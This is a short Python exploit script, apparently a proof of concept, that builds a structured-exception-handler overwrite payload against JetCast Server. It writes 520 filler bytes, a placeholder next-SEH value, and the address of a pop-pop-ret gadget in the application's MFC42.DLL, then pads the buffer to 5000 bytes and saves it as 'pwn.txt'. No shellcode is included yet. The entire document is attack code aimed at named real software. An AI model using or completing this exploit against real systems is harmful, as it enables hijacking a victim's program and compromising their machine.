#!/usr/bin/python

nSeh = "B" * 4
Seh  = "\x52\x21\x45\x5f" # 0x5f452152 : pop ebx # pop ebp # ret 0x10  - C:\Program Files\JetCast Server\MFC42.DLL

payload  = "A" * 520
payload += nSeh
payload += Seh
payload += "D" * (5000 - len(payload))

f = open('pwn.txt', 'w')
f.write(payload)
f.close()

